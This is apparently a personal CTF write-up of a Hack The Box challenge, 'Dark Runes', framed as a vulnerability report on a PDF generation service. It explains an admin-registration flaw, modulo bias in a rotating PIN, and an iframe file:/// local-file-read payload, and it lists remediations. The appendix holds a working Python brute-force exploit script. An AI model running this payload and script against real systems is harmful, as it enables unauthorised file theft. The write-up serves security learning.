---
name: Dark Runes
starting_date: 2026-04-19
modified: 2026-04-27T17:08:51+03:00
private: true
tags:
machine_link: https://www.hackthebox.com/challenges/Dark%2520Runes
difficulty: easy
created: 2026-04-19T18:00:30+03:00
type: CTF
---
# Vulnerability Assessment Report: PDF Generation Service

## Executive Summary

During the assessment of the target application, a critical exploit chain was discovered leading to **Arbitrary Local File Read (LFI)**. By chaining a cryptographic flaw (Modulo Bias) with an exposed debug endpoint and an insecure PDF rendering engine, an attacker can extract sensitive system files (e.g., `/flag.txt`, `/etc/passwd`).

---
## initial Reconnaissance & The Sanitizer Trap

Initial analysis focused on the `/documents` endpoint, which utilized `markdown-pdf` and `sanitize-html`.

While a mutation XSS bypass was identified in the sanitizer configuration (allowing an attacker to smuggle an `<iframe>` inside an `<a>` tag's `style` attribute), this path proved unnecessarily complex due to the presence of a completely unsanitized debug endpoint.
## Register as Admin
The `/register` page doesn't prevent you from signing up with the "admin" username. To gain admin access, you simply need to create a new user with that name.
## The Vulnerable Endpoint (`/document/debug/export`)
The application exposes a debug route intended for administrative use.
```JavaScript
router.post("/document/debug/export", isAuthenticated, isAdmin, async (req, res) => {
  const { access_pass, content } = req.body;
  if (!verifyPass(access_pass)) { ... }
  const generatedPDF = await generatePDF(content);
  // ...
```

**Critical Finding:** Unlike the standard document route, the `content` parameter here is passed directly to `generatePDF()` without any sanitization or Markdown translation. If the `access_pass` check can be bypassed, arbitrary HTML/JavaScript can be executed by the underlying PhantomJS engine.
## 3. The Cryptographic Flaw (Modulo Bias)
The `verifyPass` function checks the user's input against a rotating 4-digit PIN stored in a local file. If the guess is incorrect, the application immediately generates a new PIN using the following logic:
```JavaScript
const secureCode = (randomBytes.readUInt16BE() % 10000).toString().padStart(4, "0");
```

**The Flaw:** Generating random numbers by mapping a larger, non-multiple range (16-bit integer: $0$ to $65,535$) into a smaller range ($10,000$) introduces severe **Modulo Bias**.
- Numbers $0000$ to $5535$ appear $7$ times in the modulus cycle.
- Numbers $5536$ to $9999$ appear only $6$ times.
- 
**Statistical Impact:**
- $P(0000 \le x \le 5535) \approx 59.1\%$
- $P(5536 \le x \le 9999) \approx 40.9\%$

This heavily skews the probability distribution, making numbers in the lower half significantly more likely to be generated.
## 4. The Exploit Chain: "Collision Attack"
Because the PIN rotates on every failed attempt, a sequential brute-force attack (guessing 0000, 0001, 0002...) is ineffective against a moving target.

Instead, the vulnerability is exploited using a **Collision Attack**:
1. **Static Target:** The attacker continuously sends the exact same guess (e.g., `0000`).
2. **Probability Leverage:** Because `0000` falls within the biased range, it has a $1$ in $\approx 9,362$ chance of being generated.
3. **Middleware Bypass:** The application's Express server lacks `express.json()` middleware but accepts `application/x-www-form-urlencoded` payloads. The attacker sends the static PIN and the LFI payload via URL-encoded form data.
4. **Execution:** Once the server randomly generates `0000`, the validation passes, and the malicious `<iframe src='file:///flag.txt'>` is rendered into the PDF, exfiltrating the local file.
## 5. Remediation Recommendations
1. **Fix the RNG:** Replace the modulo arithmetic with a secure integer generation method, such as `crypto.randomInt(0, 10000)`.
2. **Sanitize Debug Inputs:** Apply the same `sanitize-html` logic to the debug route as the standard application routes.
3. **Modernize Dependencies:** Deprecate `markdown-pdf` (which relies on the vulnerable and unmaintained PhantomJS) in favor of a sandboxed, modern library like Puppeteer with local file access strictly disabled.
4. **Implement Rate Limiting:** Add strict rate limiting (e.g., `express-rate-limit`) to the debug route to prevent rapid, automated guessing.
---
### Appendix: Exploit Script

Python

```python
import requests
import sys

# Abstracted for lab environments
TARGET_URL = "http://IP:PORT/document/debug/export"
COOKIE = {"user": "ADMIN_COOKIE"}
FILENAME = "result.pdf"

# The iframe method is often more stable in PhantomJS than JS XMLHttpRequests
attack_payload = "<iframe src='file:///flag.txt' width='100%' height='500px'></iframe>"
payload = {"content": attack_payload, "access_pass": "0000"}

def run_attack():
    print(f"[*] Starting attack on {TARGET_URL}")
    print("[*] Target PIN: 0000 (Exploiting Modulo Bias)")
    
    # Use a Session for connection pooling (massive speed boost)
    with requests.Session() as session:
        for attempt in range(1, 15001):  # 15,000 gives a solid statistical chance
            
            try:
                response = session.post(TARGET_URL, data=payload, cookies=COOKIE)
                
                # Check if we bypassed the 403 Forbidden
                if response.status_code == 200:
                    print(f"\n[+] SUCCESS on attempt {attempt}! Status: {response.status_code}")
                    print("[+] Saving PDF...")
                    
                    with open(FILENAME, "wb") as f:
                        for chunk in response.iter_content(chunk_size=8192):
                            if chunk:
                                f.write(chunk)
                                
                    print(f"[+] File saved as {FILENAME}. Go read your flag!")
                    break
                
                # Logging: Print progress on the same line every 100 requests
                elif attempt % 100 == 0:
                    sys.stdout.write(f"\r[-] Attempt {attempt} failed (403). Still trying...")
                    sys.stdout.flush()
                    
            except requests.exceptions.RequestException as e:
                print(f"\n[!] Connection error on attempt {attempt}: {e}")
                break

if __name__ == "__main__":
    run_attack()
```